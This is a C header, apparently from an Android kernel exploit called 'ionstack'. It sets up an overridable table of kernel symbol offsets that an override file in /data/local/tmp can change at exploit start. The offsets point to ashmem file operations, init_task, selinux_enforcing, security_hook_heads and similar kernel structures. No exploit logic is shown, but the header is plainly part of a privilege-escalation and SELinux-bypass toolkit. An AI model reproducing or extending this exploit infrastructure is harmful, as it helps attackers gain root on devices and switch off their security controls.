#ifndef KSYM_CONFIG_H
#define KSYM_CONFIG_H

/*
 * Runtime-overridable kernel symbol table.
 *
 * All kernel-version-dependent symbol offsets (function/variable
 * addresses relative to the kernel image base) live in g_ksym with
 * built-in defaults taken from the active target.h. At exploit start
 * ksym_config_init() looks for an override file:
 *
 *   1. $IONSTACK_CONFIG (if set)
 *   2. /data/local/tmp/ionstack.conf
 *
 * The file is a simple "key = value" list (hex or decimal), e.g.:
 *
 *   kimage_text_base   = 0xffffffc008000000
 *   ashmem_fops_off    = 0x01ec87e0
 *   init_task_off      = 0x027ec200
 *
 * Unknown keys are ignored, so one file can carry symbols for several
 * builds. Only offsets/addresses are configurable; struct member
 * offsets stay compile-time in target.h.
 */

#include <stddef.h>
#include <stdint.h>

struct ksym_config {
  uint64_t kimage_text_base;

  uint64_t random_misc_fops_off;
  uint64_t ashmem_misc_fops_off;
  uint64_t ashmem_fops_off;
  uint64_t ashmem_ioctl_off;
  uint64_t ashmem_compat_ioctl_off;
  uint64_t ashmem_mmap_off;
  uint64_t ashmem_open_off;
  uint64_t ashmem_release_off;
  uint64_t ashmem_show_fdinfo_off;
  uint64_t ashmem_read_iter_off;
  uint64_t configfs_read_file_off;
  uint64_t configfs_write_bin_file_off;
  uint64_t copy_splice_read_off;
  uint64_t noop_llseek_off;

  uint64_t init_task_off;
  uint64_t init_uts_ns_off;
  uint64_t empty_zero_page_off;
  uint64_t root_task_group_off;
  uint64_t selinux_blob_sizes_off;
  uint64_t selinux_enforcing_off;
  uint64_t security_hook_heads_off;
  uint64_t kmalloc_caches_off;
  uint64_t anon_pipe_buf_ops_off;

  uint64_t slide_random_boot_id_data_off;
  uint64_t slide_sysctl_bootid_off;
  uint64_t slide_loggers_0_1_off;
  uint64_t slide_nfulnl_logger_off;
};

extern struct ksym_config g_ksym;

/* Load overrides from an explicit path; returns number of keys applied
 * or -1 if the file could not be read. */
int ksym_config_load(const char *path);
/* Resolve the default config location (env, then /data/local/tmp) and
 * load it if present. Safe to call once at exploit start. */
void ksym_config_init(void);

#define KIMAGE_TEXT_BASE (g_ksym.kimage_text_base)

#define RANDOM_MISC_FOPS  (KIMAGE_TEXT_BASE + g_ksym.random_misc_fops_off)
#define ASHMEM_MISC_FOPS  (KIMAGE_TEXT_BASE + g_ksym.ashmem_misc_fops_off)
#define ASHMEM_FOPS       (KIMAGE_TEXT_BASE + g_ksym.ashmem_fops_off)
#define ASHMEM_IOCTL      (KIMAGE_TEXT_BASE + g_ksym.ashmem_ioctl_off)
#define ASHMEM_COMPAT_IOCTL \
  (KIMAGE_TEXT_BASE + g_ksym.ashmem_compat_ioctl_off)
#define ASHMEM_MMAP       (KIMAGE_TEXT_BASE + g_ksym.ashmem_mmap_off)
#define ASHMEM_OPEN       (KIMAGE_TEXT_BASE + g_ksym.ashmem_open_off)
#define ASHMEM_RELEASE    (KIMAGE_TEXT_BASE + g_ksym.ashmem_release_off)
#define ASHMEM_READ_ITER  (KIMAGE_TEXT_BASE + g_ksym.ashmem_read_iter_off)
#define ASHMEM_SHOW_FDINFO \
  (KIMAGE_TEXT_BASE + g_ksym.ashmem_show_fdinfo_off)
#define CONFIGFS_READ_FILE \
  (KIMAGE_TEXT_BASE + g_ksym.configfs_read_file_off)
#define CONFIGFS_BIN_WRITE_FILE \
  (KIMAGE_TEXT_BASE + g_ksym.configfs_write_bin_file_off)
#define COPY_SPLICE_READ  (KIMAGE_TEXT_BASE + g_ksym.copy_splice_read_off)
#define NOOP_LLSEEK       (KIMAGE_TEXT_BASE + g_ksym.noop_llseek_off)

#define INIT_TASK         (KIMAGE_TEXT_BASE + g_ksym.init_task_off)
#define INIT_UTS_NS       (KIMAGE_TEXT_BASE + g_ksym.init_uts_ns_off)
#define EMPTY_ZERO_PAGE   (KIMAGE_TEXT_BASE + g_ksym.empty_zero_page_off)
#define ROOT_TASK_GROUP   (KIMAGE_TEXT_BASE + g_ksym.root_task_group_off)
#define SELINUX_BLOB_SIZES \
  (KIMAGE_TEXT_BASE + g_ksym.selinux_blob_sizes_off)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + g_ksym.selinux_enforcing_off)
#define SECURITY_HOOK_HEADS \
  (KIMAGE_TEXT_BASE + g_ksym.security_hook_heads_off)
#define KMALLOC_CACHES    (KIMAGE_TEXT_BASE + g_ksym.kmalloc_caches_off)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + g_ksym.anon_pipe_buf_ops_off)

#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + g_ksym.slide_random_boot_id_data_off)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + g_ksym.slide_sysctl_bootid_off)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + g_ksym.slide_loggers_0_1_off)
#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + g_ksym.slide_nfulnl_logger_off)
#define SLIDE_INIT_TASK_IMAGE    INIT_TASK
#define SLIDE_ROOT_TASK_GROUP_IMAGE ROOT_TASK_GROUP

#endif
